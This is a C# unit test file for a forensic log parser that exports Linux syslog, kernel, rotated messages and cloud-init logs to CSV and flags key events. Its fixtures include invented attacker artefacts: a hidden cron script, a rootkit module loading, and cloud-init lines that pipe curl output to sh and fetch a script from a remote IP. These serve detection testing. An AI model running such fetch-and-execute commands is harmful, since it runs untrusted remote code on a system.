using System.IO.Compression;
using System.Text;
using ArtefactForge.Core.Linux;

namespace ArtefactForge.Tests;

/// <summary>General system logs: syslog, messages, kern.log and cloud-init, with made-up hosts and users.</summary>
public class SyslogTests
{
    private static (string Out, string Errors) Run(TempDirectory dir)
    {
        var output = Path.Combine(dir.Path, "out");
        using var log = new StringWriter();
        using var errors = new StringWriter();
        Assert.Equal(0, SyslogExport.Run(Path.Combine(dir.Path, "root"), output, log, errors, CancellationToken.None));
        return (output, errors.ToString());
    }

    private static string Log(TempDirectory dir, string name, string text, DateTime lastWrite)
    {
        var path = dir.File(Path.Combine("root", "var", "log", name));
        File.WriteAllText(path, text);
        File.SetLastWriteTime(path, lastWrite);
        return path;
    }

    [Fact]
    public void Classic_and_rfc3339_lines_are_both_read_and_the_year_inferred_only_when_missing()
    {
        using var dir = new TempDirectory();
        Log(dir, "syslog",
            "Dec 31 23:59:58 host01 systemd[1]: Starting Daily apt upgrade...\n" +
            "Jan  1 00:00:05 host01 CRON[2201]: (alice) CMD (/home/alice/.cache/.u/run.sh >/dev/null 2>&1)\n" +
            "2027-01-01T00:01:00.123456+01:00 host01 kernel: [ 12.345] eth0: entered promiscuous mode\n",
            new DateTime(2027, 1, 2));
        Log(dir, "auth.log", "Jan  1 00:00:00 host01 sshd[1]: not read here\n", new DateTime(2027, 1, 2));

        var (output, errors) = Run(dir);

        Assert.Equal("", errors);
        var rows = CsvReader.Read(Path.Combine(output, "LinuxSyslog_Events.csv"));
        Assert.Equal(3, rows.Count);
        Assert.Equal(("2026-12-31 23:59:58", "yes"), (rows[0]["Timestamp"], rows[0]["YearInferred"]));
        Assert.Equal("2027-01-01 00:00:05", rows[1]["Timestamp"]);
        Assert.Equal(("CRON", "2201", "host01"), (rows[1]["Process"], rows[1]["PID"], rows[1]["Host"]));
        Assert.Equal(("2026-12-31 23:01:00.123456", "no"), (rows[2]["TimestampUtc"], rows[2]["YearInferred"]));
        Assert.All(rows, r => Assert.Equal("syslog", r["Log"]));

        var keys = CsvReader.Read(Path.Combine(output, "LinuxSyslog_KeyEvents.csv"));
        Assert.Equal(["Cron job run", "Interface set promiscuous"], keys.Select(k => k["Event"]));
        Assert.Equal("alice: /home/alice/.cache/.u/run.sh >/dev/null 2>&1", keys[0]["Detail"]);
    }

    [Fact]
    public void Kernel_lines_about_modules_and_usb_devices_are_key_events()
    {
        using var dir = new TempDirectory();
        Log(dir, "kern.log",
            "Oct 11 10:00:00 host01 kernel: [ 100.1] diamorphine: loading out-of-tree module taints kernel.\n" +
            "Oct 11 10:00:00 host01 kernel: [ 100.2] diamorphine: module verification failed: signature and/or required key missing - tainting kernel\n" +
            "Oct 11 10:05:00 host01 kernel: [ 400.0] usb 1-1: New USB device found, idVendor=0781, idProduct=5581, bcdDevice= 1.00\n" +
            "Oct 11 10:05:00 host01 kernel: [ 400.1] usb 1-1: Product: Ultra\n",
            new DateTime(2026, 10, 12));

        var (output, _) = Run(dir);

        var keys = CsvReader.Read(Path.Combine(output, "LinuxSyslog_KeyEvents.csv"));
        Assert.Equal(["Out-of-tree kernel module loaded", "Unsigned kernel module loaded", "USB device connected", "USB device connected"],
                     keys.Select(k => k["Event"]));
    }

    [Fact]
    public void Rotations_are_read_oldest_first_and_a_line_in_no_known_format_is_kept()
    {
        using var dir = new TempDirectory();
        using (var buffer = new MemoryStream())
        {
            using (var gz = new GZipStream(buffer, CompressionLevel.Fastest, leaveOpen: true))
                gz.Write(Encoding.UTF8.GetBytes("Oct  9 08:00:00 host01 rsyslogd: older\n"));
            File.WriteAllBytes(dir.File(Path.Combine("root", "var", "log", "messages.2.gz")), buffer.ToArray());
        }
        File.SetLastWriteTime(Path.Combine(dir.Path, "root", "var", "log", "messages.2.gz"), new DateTime(2026, 10, 9, 9, 0, 0));
        Log(dir, "messages", "Oct 11 08:00:00 host01 rsyslogd: newer\n   wrapped continuation line\n", new DateTime(2026, 10, 11, 9, 0, 0));

        var (output, _) = Run(dir);

        var rows = CsvReader.Read(Path.Combine(output, "LinuxSyslog_Events.csv"));
        Assert.Equal(["older", "newer", "   wrapped continuation line"], rows.Select(r => r["Message"]));
        Assert.Equal("", rows[2]["Timestamp"]);
    }

    [Fact]
    public void Cloud_init_log_and_its_script_output_are_read()
    {
        using var dir = new TempDirectory();
        Log(dir, "cloud-init.log", "2026-10-11 09:00:00,123 - util.py[DEBUG]: Running command ['sh', '-c', 'curl x | sh']\n", new DateTime(2026, 10, 11));
        Log(dir, "cloud-init-output.log", "Cloud-init v. 23.1 running 'modules:final'\n+ curl -s http://203.0.113.5/i.sh\n", new DateTime(2026, 10, 11));

        var (output, _) = Run(dir);

        var row = Assert.Single(CsvReader.Read(Path.Combine(output, "LinuxSyslog_Events.csv")));
        Assert.Equal(("2026-10-11 09:00:00.123", "util.py"), (row["Timestamp"], row["Process"]));
        Assert.StartsWith("[DEBUG] Running command", row["Message"]);
        var script = CsvReader.Read(Path.Combine(output, "LinuxSyslog_CloudInitOutput.csv"));
        Assert.Equal(("2", "+ curl -s http://203.0.113.5/i.sh"), (script[1]["Line"], script[1]["Text"]));
    }
}
